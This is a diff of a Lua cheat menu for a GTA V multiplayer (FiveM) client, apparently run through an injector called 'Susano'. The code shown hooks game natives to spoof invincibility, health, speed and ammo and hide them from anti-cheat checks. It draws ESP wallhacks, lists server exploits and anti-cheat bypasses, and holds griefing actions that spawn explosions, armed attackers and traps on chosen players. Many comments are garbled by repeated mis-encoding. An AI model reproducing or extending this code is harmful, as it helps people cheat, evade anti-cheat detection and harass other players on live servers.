@@ -90,29 +90,6 @@ end
 -- Strip \r from HTTP content for consistent pattern matching
 LibraryCode = string.gsub(LibraryCode, "\r", "")
 
--- ============================================
--- PATCH: Delete / Suppr closes from the main page
--- ============================================
--- The library reads its navigation keys inside Menu.HandleInput on the render
--- loop. A 40 ms scheduler poll can miss a fast tap, so the key is also read
--- where the library reads its own keys. The injected line calls
--- Menu.__vgdDeleteTick (defined by the integrated module once Menu exists):
--- inside a category it walks the same path as Backspace, on the main page it
--- hides the menu, and it returns true only when it acted, which skips the rest
--- of HandleInput for that frame. If the marker is missing the library is left
--- untouched; the scheduler fallback still reads the key.
-do
-    local hooked = false
-    LibraryCode = LibraryCode:gsub("function Menu%.HandleInput%(%)", function(match)
-        if hooked then return match end
-        hooked = true
-        return match .. "\n    if Menu.__vgdDeleteTick and Menu.__vgdDeleteTick() then return end"
-    end, 1)
-    if not hooked then
-        print("[Menu] delete hook: HandleInput marker not found; poll fallback only")
-    end
-end
-
 -- Patch tag display [RISK] (red) / [DYNASTY] (purple) / [SEED] (green)
 LibraryCode = string.gsub(
     LibraryCode,
@@ -191,6 +168,29 @@ if not chunk then
 end
 
 local Menu = chunk()
+
+-- ============================================
+-- PATCH: Delete / Suppr closes the menu
+-- ============================================
+-- The library calls Menu.HandleInput() by field on every render frame, so
+-- replacing the field is independent of the downloaded text. The check is a
+-- no-op until the integrated module defines Menu.__vgdDeleteTick; from then on
+-- the key is read on the library's own frame loop, which catches a fast tap
+-- that the 40 ms scheduler poll can miss. Returning true skips the rest of
+-- HandleInput for that frame. The scheduler fallback stays armed in 07_menu.
+do
+    if type(Menu) == "table" and type(Menu.HandleInput) == "function" and not Menu.__vgdInputWrapped then
+        local vgdHandleInput = Menu.HandleInput
+        Menu.HandleInput = function()
+            if Menu.__vgdDeleteTick and Menu.__vgdDeleteTick(true) then return end
+            return vgdHandleInput()
+        end
+        Menu.__vgdInputWrapped = true
+        print("[Menu] delete hook: HandleInput wrapper installed")
+    elseif type(Menu) == "table" then
+        print("[Menu] delete hook: Menu.HandleInput missing; poll fallback only")
+    end
+end
 
 -- ============================================
 -- VANGUARD THEME PATCH
@@ -387,7 +387,7 @@ Menu.UpdatePlayerCount = function() end
 Menu.ShowSnowflakes = true -- sync avec Flocon value = true
 
 -- ============================================
--- DÃ‰BUT DU CODE ORIGINAL (ligne 39 de l'ancien fichier)
+-- DÃƒâ€°BUT DU CODE ORIGINAL (ligne 39 de l'ancien fichier)
 -- ============================================
 Menu.shooteyesEnabled = false
 Menu.magicbulletEnabled = false
@@ -407,8 +407,8 @@ Menu.WarpPressW = false
 -- ============================================
 -- STEALTH AUTO-SPOOF SYSTEM
 -- ============================================
--- Hooks enregistrés une seule fois. Conditionnés par flags.
--- Chaque feature toggle active/désactive ses flags automatiquement.
+-- Hooks enregistrÃ©s une seule fois. ConditionnÃ©s par flags.
+-- Chaque feature toggle active/dÃ©sactive ses flags automatiquement.
 
 _Stealth = {
     invincible = false,
@@ -430,7 +430,7 @@ local _fakeAmmo = {}
 do
     if type(Susano) == "table" and type(Susano.HookNative) == "function" then
 
-        -- GetPlayerInvincible → false
+        -- GetPlayerInvincible â†’ false
         Susano.HookNative(0xB721981B2B939E07, function(player)
             if _Stealth.invincible and player == PlayerId() then
                 return false, false
@@ -438,7 +438,7 @@ do
             return true
         end)
 
-        -- GetEntityHealth → 190-200
+        -- GetEntityHealth â†’ 190-200
         Susano.HookNative(0xEEF059FAD016D209, function(entity)
             if _Stealth.health and entity == PlayerPedId() then
                 return false, 190 + math.random(0, 10)
@@ -446,7 +446,7 @@ do
             return true
         end)
 
-        -- GetPlayerStamina → oscillation 45-98
+        -- GetPlayerStamina â†’ oscillation 45-98
         Susano.HookNative(0xCEFD02E1E6BC7AF0, function(player)
             if _Stealth.stamina and player == PlayerId() then
                 local now = GetGameTimer()
@@ -461,7 +461,7 @@ do
             return true
         end)
 
-        -- GetEntitySpeed → cap 6.5-8.0 m/s
+        -- GetEntitySpeed â†’ cap 6.5-8.0 m/s
         Susano.HookNative(0xD5037BA82E12416F, function(entity)
             if _Stealth.speed then
                 local ped = PlayerPedId()
@@ -472,7 +472,7 @@ do
             return true
         end)
 
-        -- GetAmmoInPedWeapon → fake count décroissant
+        -- GetAmmoInPedWeapon â†’ fake count dÃ©croissant
         Susano.HookNative(0x015A522136D7F951, function(ped, weaponHash)
             if _Stealth.ammo and ped == PlayerPedId() then
                 if not _fakeAmmo[weaponHash] then
@@ -848,7 +848,7 @@ end
 
 Menu.Categories = {
     { name = "Main Menu", icon = "P" },
-    { name = "Player", iconUrl = "https://i.imgur.com/CI38tSd.png", icon = "ðŸ‘¤", hasTabs = true, tabs = {
+    { name = "Player", iconUrl = "https://i.imgur.com/CI38tSd.png", icon = "Ã°Å¸â€˜Â¤", hasTabs = true, tabs = {
         { name = "Self", items = {
             { name = "", isSeparator = true, separatorText = "Health" },
             { name = "Revive", type = "action" },
@@ -871,7 +871,7 @@ Menu.Categories = {
             { name = "Shoes", type = "selector", options = {}, selected = 1 }
         }}
     }},
-    { name = "Online", iconUrl = "https://i.imgur.com/9k1REcK.png", icon = "ðŸ‘¥", hasTabs = true, tabs = {
+    { name = "Online", iconUrl = "https://i.imgur.com/9k1REcK.png", icon = "Ã°Å¸â€˜Â¥", hasTabs = true, tabs = {
         { name = "Player List", items = {
             { name = "Loading players...", type = "action" }
         }},
@@ -954,7 +954,7 @@ Menu.Categories = {
             { name = "Launch All", type = "action" }
         }}
     }},
-    { name = "Visual", iconUrl = "https://i.imgur.com/iHvywcn.png", icon = "ðŸ‘", hasTabs = true, tabs = {
+    { name = "Visual", iconUrl = "https://i.imgur.com/iHvywcn.png", icon = "Ã°Å¸â€˜Â", hasTabs = true, tabs = {
         { name = "World", items = {
             { name = "FPS Boost", type = "toggle", value = false },
             { name = "Time", type = "slider", value = 12.0, min = 0.0, max = 23.0 },
@@ -965,7 +965,7 @@ Menu.Categories = {
             { name = "Delete All Props", type = "action" }
         }}
     }},
-    { name = "Combat", iconUrl = "https://i.imgur.com/zeRlEgV.png", icon = "ðŸ”«", hasTabs = true, tabs = {
+    { name = "Combat", iconUrl = "https://i.imgur.com/zeRlEgV.png", icon = "Ã°Å¸â€Â«", hasTabs = true, tabs = {
         { name = "General", items = {
             { name = "Attach Target (H)", type = "toggle", value = false, onClick = function(val) ToggleAttachTarget(val) end },
             { name = "", isSeparator = true, separatorText = "Weapon Mods" },
@@ -1001,7 +1001,7 @@ Menu.Categories = {
             { name = "weapon_hk_ump", type = "action" }
         }}
     }},
-    { name = "Vehicle", iconUrl = "https://i.imgur.com/DkzEgPb.png", icon = "ðŸš—", hasTabs = true, tabs = {
+    { name = "Vehicle", iconUrl = "https://i.imgur.com/DkzEgPb.png", icon = "Ã°Å¸Å¡â€”", hasTabs = true, tabs = {
         { name = "Performance", items = {
             { name = "", isSeparator = true, separatorText = "Warp" },
             { name = "FOV Warp", type = "toggle", value = false, onClick = function(val) Menu.FOVWarp = val end },
@@ -1180,7 +1180,7 @@ Menu.Categories = {
             end }
         }}
     }},
-    { name = "Exploit", iconUrl = "https://i.imgur.com/G4seAMg.png", icon = "💀", hasTabs = true, tabs = {
+    { name = "Exploit", iconUrl = "https://i.imgur.com/G4seAMg.png", icon = "ðŸ’€", hasTabs = true, tabs = {
         { name = "Exploits", items = {
             { name = "", isSeparator = true, separatorText = "Server" },
             { name = "Staff Mode", type = "toggle", value = false, dynasty = true},
@@ -1202,7 +1202,7 @@ Menu.Categories = {
             { name = "Bypass Putin", type = "action", dynasty = true },
         }}
     }},
-    { name = "Settings", iconUrl = "https://i.imgur.com/FQsvrIJ.png", icon = "âš™", hasTabs = true, tabs = {
+    { name = "Settings", iconUrl = "https://i.imgur.com/FQsvrIJ.png", icon = "Ã¢Å¡â„¢", hasTabs = true, tabs = {
         { name = "General", items = {
             { name = "Editor Mode", type = "toggle", value = false },
             { name = "Menu Size", type = "slider", value = 110.0, min = 50.0, max = 200.0, step = 1.0 },
@@ -1214,7 +1214,7 @@ Menu.Categories = {
     }}
 }
 
--- Appliquer le thème vert par défaut au démarrage
+-- Appliquer le thÃ¨me vert par dÃ©faut au dÃ©marrage
 if Menu.ApplyTheme then
     Menu.ApplyTheme("Green")
 end
@@ -1393,7 +1393,7 @@ local espSettings = nil
 -- ESP Cache pour optimisation
 local ESPCache = {}
 local ESPCacheTime = 0
-local ESPCacheMaxAge = 0.016 -- 1 frame Ã  60fps
+local ESPCacheMaxAge = 0.016 -- 1 frame ÃƒÂ  60fps
 
 local function GetScreenSize()
     if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
@@ -2003,10 +2003,10 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
     local targetPos = GetEntityCoords(targetPed)
     local dist = #(myPos - targetPos)
     
-    -- Optimisation: vÃ©rifier la distance avant les calculs coÃ»teux
+    -- Optimisation: vÃƒÂ©rifier la distance avant les calculs coÃƒÂ»teux
     if dist > 100.0 then return end
     
-    -- Cache pour Ã©viter les recalculs frÃ©quents
+    -- Cache pour ÃƒÂ©viter les recalculs frÃƒÂ©quents
     local cacheKey = tostring(targetPed) .. "_" .. tostring(playerIdx)
     local currentTime = GetGameTimer() or 0
     local cached = ESPCache[cacheKey]
@@ -2067,14 +2067,14 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         local textColor = ESPColors[1]
         if settings["Text Color"] then textColor = ESPColors[settings["Text Color"].selected] or textColor end
 
-        -- Skeleton (optimisÃ© avec cache des os)
+        -- Skeleton (optimisÃƒÂ© avec cache des os)
         if drawSkeleton then
             local boneCache = {}
             for _, connection in ipairs(SkeletonConnections) do
                 local bone1 = connection[1]
                 local bone2 = connection[2]
                 
-                -- Cache des positions des os pour Ã©viter les appels rÃ©pÃ©tÃ©s
+                -- Cache des positions des os pour ÃƒÂ©viter les appels rÃƒÂ©pÃƒÂ©tÃƒÂ©s
                 local pos1 = boneCache[bone1]
                 if not pos1 then
                     pos1 = GetPedBoneCoords(targetPed, bone1, 0.0, 0.0, 0.0)
@@ -2090,7 +2090,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
                 local os1, x1, y1 = GetScreenCoordFromWorldCoord(pos1.x, pos1.y, pos1.z)
                 local os2, x2, y2 = GetScreenCoordFromWorldCoord(pos2.x, pos2.y, pos2.z)
 
-                -- Optimisation: vÃ©rifier que les coordonnÃ©es sont valides et dans l'Ã©cran
+                -- Optimisation: vÃƒÂ©rifier que les coordonnÃƒÂ©es sont valides et dans l'ÃƒÂ©cran
                 if os1 and os2 and x1 and y1 and x2 and y2 and 
                    x1 >= 0 and x1 <= 1 and y1 >= 0 and y1 <= 1 and
                    x2 >= 0 and x2 <= 1 and y2 >= 0 and y2 <= 1 and
@@ -2103,7 +2103,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             end
         end
         
-        -- Calculate 2D Box & Info Positions (optimisÃ© avec cache)
+        -- Calculate 2D Box & Info Positions (optimisÃƒÂ© avec cache)
         local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
         local footPos = GetEntityCoords(targetPed)
         footPos = vector3(footPos.x, footPos.y, footPos.z - 1.0) -- Adjust for bottom
@@ -2133,11 +2133,11 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             ESPCache[footCacheKey] = {x = footX, y = footY, time = currentTime}
         end
         
-        -- VÃ©rifier que les coordonnÃ©es sont valides avant de calculer la box
+        -- VÃƒÂ©rifier que les coordonnÃƒÂ©es sont valides avant de calculer la box
         if not headX or not headY or not footX or not footY then return end
         
         local height = math.abs(headY - footY)
-        if height < 0.01 then return end -- Ã‰viter les boxes trop petites
+        if height < 0.01 then return end -- Ãƒâ€°viter les boxes trop petites
         
         local width = height * 0.35 -- Thinner box (was 0.5)
         
@@ -2149,7 +2149,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         -- Fix Y order if inverted
         if boxY1 > boxY2 then boxY1, boxY2 = boxY2, boxY1 end
 
-        -- Box (optimisÃ© - vÃ©rifier que la box est valide)
+        -- Box (optimisÃƒÂ© - vÃƒÂ©rifier que la box est valide)
         if drawBox and boxX1 and boxX2 and boxY1 and boxY2 then
             -- Draw thin black outline
             Draw2DBox(boxX1 - 0.0005, boxY1 - 0.0005, boxX2 + 0.0005, boxY2 + 0.0005, 0.0, 0.0, 0.0, 1.0, screenW, screenH)
@@ -2157,7 +2157,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             Draw2DBox(boxX1, boxY1, boxX2, boxY2, boxColor[1], boxColor[2], boxColor[3], 1.0, screenW, screenH)
         end
         
-        -- Snapline (optimisÃ© - vÃ©rifier que footX et footY sont valides)
+        -- Snapline (optimisÃƒÂ© - vÃƒÂ©rifier que footX et footY sont valides)
         if drawLine and Susano.DrawLine and footX and footY then
              Susano.DrawLine(screenW / 2, screenH, footX * screenW, footY * screenH, lineColor[1], lineColor[2], lineColor[3], 1.0, 1)
         end
@@ -2178,7 +2178,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         if drawWeapon then
              local _, weaponHash = GetCurrentPedWeapon(targetPed, true)
              local weaponName = GetWeaponNameFromHash(weaponHash)
-             -- GetWeaponNameFromHash retourne dÃ©jÃ  "Unarmed" pour WEAPON_UNARMED
+             -- GetWeaponNameFromHash retourne dÃƒÂ©jÃƒÂ  "Unarmed" pour WEAPON_UNARMED
              AddToBucket(drawWeaponPos + 1, weaponName)
         end
         
@@ -2226,7 +2226,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             end
         end
         
-        -- Health & Armor Bars (optimisÃ© - vÃ©rifier que la box est valide)
+        -- Health & Armor Bars (optimisÃƒÂ© - vÃƒÂ©rifier que la box est valide)
         if (drawHealth or drawArmor) and boxX1 and boxY1 and boxY2 then
             local barW = 2 -- Thinner bar
             
@@ -5056,7 +5056,7 @@ end
 
 function Menu.ActionChangePlate()
     if Menu and Menu.OpenInput then
-        Menu.OpenInput("Change Plate", "Entrez le texte de la plaque (max 8 caractÃ¨res):", function(input)
+        Menu.OpenInput("Change Plate", "Entrez le texte de la plaque (max 8 caractÃƒÂ¨res):", function(input)
             if input and input ~= "" then
                 local plateText = string.sub(input, 1, 8)
                 if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
@@ -8792,7 +8792,7 @@ end)
                                     local ped = PlayerPedId()
                                     if not ped or not DoesEntityExist(ped) then return end
                                     
-                                    -- Donner des munitions seulement Ã  l'arme actuellement dans les mains
+                                    -- Donner des munitions seulement ÃƒÂ  l'arme actuellement dans les mains
                                     local currentWeapon = GetSelectedPedWeapon(ped)
                                     if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                         SetPedAmmo(ped, currentWeapon, 9999)
@@ -10430,7 +10430,7 @@ end
                                     local playerPed = PlayerPedId()
                                     local myCoords = GetEntityCoords(playerPed)
                                     
-                                    -- Trouver le vÃ©hicule le plus proche
+                                    -- Trouver le vÃƒÂ©hicule le plus proche
                                     local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                                     if not closestVeh or closestVeh == 0 then return end
                                     
@@ -10438,7 +10438,7 @@ end
                                     local savedCoords = GetEntityCoords(playerPed)
                                     local savedHeading = GetEntityHeading(playerPed)
                                     
-                                    -- Obtenir le contrÃ´le du vÃ©hicule
+                                    -- Obtenir le contrÃƒÂ´le du vÃƒÂ©hicule
                                     SetEntityAsMissionEntity(closestVeh, true, true)
                                     local timeout = 1000
                                     NetworkRequestControlOfEntity(closestVeh)
@@ -10448,16 +10448,16 @@ end
                                         NetworkRequestControlOfEntity(closestVeh)
                                     end
                                     
-                                    -- Me tÃ©lÃ©porter dans le vÃ©hicule
+                                    -- Me tÃƒÂ©lÃƒÂ©porter dans le vÃƒÂ©hicule
                                     SetPedIntoVehicle(playerPed, closestVeh, -1)
                                     Wait(100)
                                     
-                                    -- Me remettre Ã  ma position originale
+                                    -- Me remettre ÃƒÂ  ma position originale
                                     SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
                                     SetEntityHeading(playerPed, savedHeading)
                                     Wait(50)
                                     
-                                    -- Positionner le vÃ©hicule derriÃ¨re le joueur cible (comme dans Luxor)
+                                    -- Positionner le vÃƒÂ©hicule derriÃƒÂ¨re le joueur cible (comme dans Luxor)
                                     local targetCoords = GetEntityCoords(ped)
                                     local spawnPos = GetOffsetFromEntityInWorldCoords(ped, 0.0, -10.0, 0.0)
                                     local heading = GetEntityHeading(ped)
@@ -10465,13 +10465,13 @@ end
                                     SetEntityCoordsNoOffset(closestVeh, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                     SetEntityHeading(closestVeh, heading)
                                     
-                                    -- Configurer le vÃ©hicule pour le ram
+                                    -- Configurer le vÃƒÂ©hicule pour le ram
                                     SetVehicleForwardSpeed(closestVeh, 100.0)
                                     SetEntityVisible(closestVeh, true, false)
                                     SetVehicleDoorsLocked(closestVeh, 4)
                                     SetVehicleEngineOn(closestVeh, true, true, false)
                                     
-                                    -- Nettoyage automatique aprÃ¨s 15 secondes
+                                    -- Nettoyage automatique aprÃƒÂ¨s 15 secondes
                                     Citizen.SetTimeout(15000, function()
                                         if DoesEntityExist(closestVeh) then
                                             DeleteVehicle(closestVeh)
@@ -10612,14 +10612,14 @@ function Menu.ActionDropVehicle()
 end
 
 -- Airstrike : Volatus en feu sur la cible
--- Cooldown global pour éviter le spam InjectResource
+-- Cooldown global pour Ã©viter le spam InjectResource
 _G._airstrikeLastUse = 0
 _G._airstrikeCD = 5000 -- 5s entre chaque
 
 function Menu.ActionAirstrike()
     if not Menu.SelectedPlayer then return end
 
-    -- Cooldown check (côté overlay)
+    -- Cooldown check (cÃ´tÃ© overlay)
     local now = GetGameTimer()
     if now - (_G._airstrikeLastUse or 0) < _G._airstrikeCD then return end
     _G._airstrikeLastUse = now
@@ -10679,14 +10679,14 @@ function Menu.ActionAirstrike()
                 SetEntityAsMissionEntity(heli, true, true)
                 SetEntityRotation(heli, -70.0, 0.0, math.random(0, 360) + 0.0, 2, true)
 
-                -- NE PAS tuer le véhicule immédiatement
-                -- On dégrade progressivement pour que RAGE ne le GC pas
+                -- NE PAS tuer le vÃ©hicule immÃ©diatement
+                -- On dÃ©grade progressivement pour que RAGE ne le GC pas
                 SetVehicleEngineHealth(heli, 100.0)
                 SetVehicleBodyHealth(heli, 200.0)
-                -- Vélocité de chute
+                -- VÃ©locitÃ© de chute
                 SetEntityVelocity(heli, 0.0, 0.0, -35.0)
 
-                -- Thread fumée/feu progressif pendant la chute
+                -- Thread fumÃ©e/feu progressif pendant la chute
                 CreateThread(function()
                     Wait(300)
                     if DoesEntityExist(heli) then
@@ -10699,9 +10699,9 @@ function Menu.ActionAirstrike()
                     end
                 end)
 
-                -- Thread principal : tracking altitude → explosion
+                -- Thread principal : tracking altitude â†’ explosion
                 local exploded = false
-                local timeout = 100 -- 5s max (100 × 50ms)
+                local timeout = 100 -- 5s max (100 Ã— 50ms)
                 while timeout > 0 and not exploded and rawget(_G, '_airstrike_active') do
                     Wait(50)
                     timeout = timeout - 1
@@ -10709,15 +10709,15 @@ function Menu.ActionAirstrike()
                     if not DoesEntityExist(heli) then break end
 
                     local heliCoords = GetEntityCoords(heli)
-                    -- Maintenir la vélocité de chute (RAGE ralentit les épaves)
+                    -- Maintenir la vÃ©locitÃ© de chute (RAGE ralentit les Ã©paves)
                     SetEntityVelocity(heli, 0.0, 0.0, -35.0)
 
-                    -- Quand l'heli est à ~12m de la cible
+                    -- Quand l'heli est Ã  ~12m de la cible
                     if heliCoords.z <= tc.z + 12.0 then
                         -- Impact principal
                         AddExplosion(heliCoords.x, heliCoords.y, heliCoords.z, 7, 5.0, true, false, 1.0)
                         Wait(50)
-                        -- Secondaires décalées
+                        -- Secondaires dÃ©calÃ©es
                         for i = 1, 3 do
                             local ox = math.random(-3, 3) + 0.0
                             local oy = math.random(-3, 3) + 0.0
@@ -10737,13 +10737,13 @@ function Menu.ActionAirstrike()
                     end
                 end
 
-                -- Timeout sans impact → forcer explosion
+                -- Timeout sans impact â†’ forcer explosion
                 if not exploded and DoesEntityExist(heli) then
                     local ec = GetEntityCoords(heli)
                     AddExplosion(ec.x, ec.y, ec.z, 7, 5.0, true, false, 1.0)
                 end
 
-                -- Cleanup entité après un délai (laisser le temps au FX)
+                -- Cleanup entitÃ© aprÃ¨s un dÃ©lai (laisser le temps au FX)
                 Wait(2000)
                 if DoesEntityExist(heli) then
                     SetEntityAsMissionEntity(heli, true, true)
@@ -12066,7 +12066,7 @@ end
                         end
                     end
 
--- Teleport Into : warp dans le véhicule de la cible comme passager
+-- Teleport Into : warp dans le vÃ©hicule de la cible comme passager
 function Menu.ActionTeleportInto()
     if not Menu.SelectedPlayer then return end
     local targetServerId = Menu.SelectedPlayer
@@ -12089,7 +12089,7 @@ function Menu.ActionTeleportInto()
 
             local targetVeh = GetVehiclePedIsIn(targetPed, false)
             if not targetVeh or targetVeh == 0 then
-                -- Pas en véhicule : TP directement à côté
+                -- Pas en vÃ©hicule : TP directement Ã  cÃ´tÃ©
                 local tc = GetEntityCoords(targetPed)
                 SetEntityCoordsNoOffset(PlayerPedId(), tc.x + 1.0, tc.y, tc.z, false, false, false)
                 return
@@ -12097,7 +12097,7 @@ function Menu.ActionTeleportInto()
 
             local playerPed = PlayerPedId()
 
-            -- Chercher un siège libre (-1=driver, 0=passager avant, 1-2=arrière)
+            -- Chercher un siÃ¨ge libre (-1=driver, 0=passager avant, 1-2=arriÃ¨re)
             local seatFound = nil
             for seat = 0, GetVehicleMaxNumberOfPassengers(targetVeh) - 1 do
                 if IsVehicleSeatFree(targetVeh, seat) then
@@ -12107,7 +12107,7 @@ function Menu.ActionTeleportInto()
             end
 
             if not seatFound then
-                -- Aucun siège libre : éjecter le passager du siège 0
+                -- Aucun siÃ¨ge libre : Ã©jecter le passager du siÃ¨ge 0
                 local passengerPed = GetPedInVehicleSeat(targetVeh, 0)
                 if passengerPed and passengerPed ~= 0 and DoesEntityExist(passengerPed) then
                     TaskLeaveVehicle(passengerPed, targetVeh, 16)
@@ -12116,7 +12116,7 @@ function Menu.ActionTeleportInto()
                 seatFound = 0
             end
 
-            -- TP au véhicule puis warp dans le siège
+            -- TP au vÃ©hicule puis warp dans le siÃ¨ge
             local vc = GetEntityCoords(targetVeh)
             SetEntityCoordsNoOffset(playerPed, vc.x, vc.y, vc.z, false, false, false)
             Wait(100)
@@ -12867,7 +12867,7 @@ function Menu.ActionPedFlood()
                             local x = tc.x + math.cos(angle) * radius
                             local y = tc.y + math.sin(angle) * radius
 
-                            -- Ground Z check : évite spawn sous la map
+                            -- Ground Z check : Ã©vite spawn sous la map
                             local foundGround, groundZ = GetGroundZFor_3dCoord(x, y, tc.z + 5.0, false)
                             local z = foundGround and groundZ or tc.z
 
@@ -12904,7 +12904,7 @@ function Menu.ActionPedFlood()
                                 totalFailed = totalFailed + 1
                             end
 
-                            -- Yield après chaque ped (anti script-hang)
+                            -- Yield aprÃ¨s chaque ped (anti script-hang)
                             Wait(10)
                         end
 
@@ -12967,7 +12967,7 @@ if Actions.pedFloodItem then
     end
 end
 
--- Ped Armed : spawn un ped armé d'un fusil à pompe sur la cible
+-- Ped Armed : spawn un ped armÃ© d'un fusil Ã  pompe sur la cible
 -- Ragdoll : force le ragdoll sur la cible via Susano.RequestRagdoll
 function Menu.ActionRagdoll()
     if not Menu.SelectedPlayer then return end
@@ -13019,21 +13019,21 @@ function Menu.ActionPedArmed()
             if not DoesEntityExist(targetPed) then return end
             local tc = GetEntityCoords(targetPed)
 
-            -- Spoof en clown côté serveur
+            -- Spoof en clown cÃ´tÃ© serveur
             local clownHash = 0x3C438FD2 -- s_m_y_clown_01
             RequestModel(clownHash)
             local tw = 50
             while not HasModelLoaded(clownHash) and tw > 0 do Wait(10); tw = tw - 1 end
             Susano.SpoofPed(clownHash, true)
 
-            -- Modèle réel : civil basique (discret)
+            -- ModÃ¨le rÃ©el : civil basique (discret)
             local modelHash = GetHashKey("a_m_m_hillbilly_01")
             RequestModel(modelHash)
             local t = 50
             while not HasModelLoaded(modelHash) and t > 0 do Wait(10); t = t - 1 end
             if not HasModelLoaded(modelHash) then Susano.SpoofPed(0, false) return end
 
-            -- Spawn juste derrière la cible (1.5m)
+            -- Spawn juste derriÃ¨re la cible (1.5m)
             local heading = GetEntityHeading(targetPed)
             local rad = math.rad(heading)
             local x = tc.x - math.sin(rad) * 1.5
@@ -13050,13 +13050,13 @@ function Menu.ActionPedArmed()
                 SetPedFleeAttributes(ped, 0, false)
                 SetBlockingOfNonTemporaryEvents(ped, true)
                 SetPedKeepTask(ped, true)
-                -- Fusil à pompe
+                -- Fusil Ã  pompe
                 GiveWeaponToPed(ped, 0x1D073A89, 250, false, true) -- WEAPON_PUMPSHOTGUN
-                -- Tir immédiat sur la cible
+                -- Tir immÃ©diat sur la cible
                 TaskCombatPed(ped, targetPed, 0, 16)
             end
 
-            -- Désactiver le spoof après spawn
+            -- DÃ©sactiver le spoof aprÃ¨s spawn
             Wait(500)
             Susano.SpoofPed(0, false)
 
@@ -14426,7 +14426,7 @@ _G._buggyRampHandles = _G._buggyRampHandles or {}
 _G._buggyRampVeh = nil
 _G._buggyRampThread = false
 _G._buggyRampForceThread = false
-_G._buggyRampCooldowns = {} -- anti-spam : 1 force par véhicule
+_G._buggyRampCooldowns = {} -- anti-spam : 1 force par vÃ©hicule
 
 local RAMP_MODEL_PRIMARY  = "prop_mp_ramp_01"
 local RAMP_MODEL_FALLBACK = "lts_prop_lts_ramp_01"
@@ -14561,7 +14561,7 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
     SetEntityInvincible(attackerPed, true)
     SetEntityInvincible(attackerVeh, true)
 
-    -- Armer le ped pour le mode combat véhicule
+    -- Armer le ped pour le mode combat vÃ©hicule
     GiveWeaponToPed(attackerPed, GetHashKey("WEAPON_MICROSMG"), 9999, false, true)
 
     _G._assaultDriverActive = true
@@ -14576,19 +14576,19 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
                 break
             end
 
-            -- Re-place le driver si éjecté
+            -- Re-place le driver si Ã©jectÃ©
             if not IsPedInVehicle(attackerPed, attackerVeh, false) then
                 SetPedIntoVehicle(attackerPed, attackerVeh, -1)
                 Citizen.Wait(100)
             end
 
-            -- Détection : cible à pied ou en véhicule ?
+            -- DÃ©tection : cible Ã  pied ou en vÃ©hicule ?
             local targetVeh = GetVehiclePedIsIn(targetPed, false)
             local targetInVehicle = targetVeh ~= 0 and DoesEntityExist(targetVeh)
 
             if not targetInVehicle then
-                -- === MODE CARKILL : cible à pied ===
-                -- TaskVehicleMissionPedTarget = foncer sur le ped pour l'écraser
+                -- === MODE CARKILL : cible Ã  pied ===
+                -- TaskVehicleMissionPedTarget = foncer sur le ped pour l'Ã©craser
                 if lastMode ~= "carkill" then
                     ClearPedTasks(attackerPed)
                     Citizen.Wait(50)
@@ -14609,7 +14609,7 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
                     true            -- DriveAgainstTraffic
                 )
             else
-                -- === MODE CHASE : cible en véhicule ===
+                -- === MODE CHASE : cible en vÃ©hicule ===
                 -- Poursuite + tir drive-by
                 if lastMode ~= "chase" then
                     ClearPedTasks(attackerPed)
@@ -14694,7 +14694,7 @@ function Menu.ActionAssaultDriver()
         return
     end
 
-    -- Spawn 30m derrière la cible
+    -- Spawn 30m derriÃ¨re la cible
     local fwd = GetEntityForwardVector(targetPed)
     local spawnX = tc.x - fwd.x * 30.0
     local spawnY = tc.y - fwd.y * 30.0
@@ -14770,7 +14770,7 @@ local function ResolveTargetCoords()
     return targetPed, GetEntityCoords(targetPed)
 end
 
--- Spawn un prop sur la position d'un joueur ciblé
+-- Spawn un prop sur la position d'un joueur ciblÃ©
 local function SpawnTubeProp(model, coords, heading)
     local hash = GetHashKey(model)
     RequestModel(hash)
@@ -14797,7 +14797,7 @@ local function SpawnTubeProp(model, coords, heading)
     return 0
 end
 
--- Rainbow Tube : ar_prop_ar_tube_crn_5d sur la position du joueur ciblé
+-- Rainbow Tube : ar_prop_ar_tube_crn_5d sur la position du joueur ciblÃ©
 function Menu.ActionRainbowTube()
     local targetPed, tc = ResolveTargetCoords()
     if not tc then
@@ -14811,8 +14811,8 @@ function Menu.ActionRainbowTube()
     end
 end
 
--- Trapped in Tube : stt_prop_stunt_tube_l centré sur le joueur
--- Le tube est posé de façon à enfermer le joueur dedans (rotation 90° pour être vertical/horizontal)
+-- Trapped in Tube : stt_prop_stunt_tube_l centrÃ© sur le joueur
+-- Le tube est posÃ© de faÃ§on Ã  enfermer le joueur dedans (rotation 90Â° pour Ãªtre vertical/horizontal)
 function Menu.ActionTrappedInTube()
     local targetPed, tc = ResolveTargetCoords()
     if not tc then
@@ -14832,7 +14832,7 @@ function Menu.ActionTrappedInTube()
     if obj and obj ~= 0 and DoesEntityExist(obj) then
         SetEntityAsMissionEntity(obj, true, true)
         NetworkRegisterEntityAsNetworked(obj)
-        -- Rotation X=90° : tube posé à l'horizontale autour du joueur
+        -- Rotation X=90Â° : tube posÃ© Ã  l'horizontale autour du joueur
         SetEntityRotation(obj, 90.0, 0.0, GetEntityHeading(targetPed), 2, true)
         FreezeEntityPosition(obj, true)
         SetEntityCollision(obj, true, true)
@@ -14925,20 +14925,20 @@ function Menu.ActionAttachToilet()
     SetEntityAsMissionEntity(obj, true, true)
     NetworkRegisterEntityAsNetworked(obj)
 
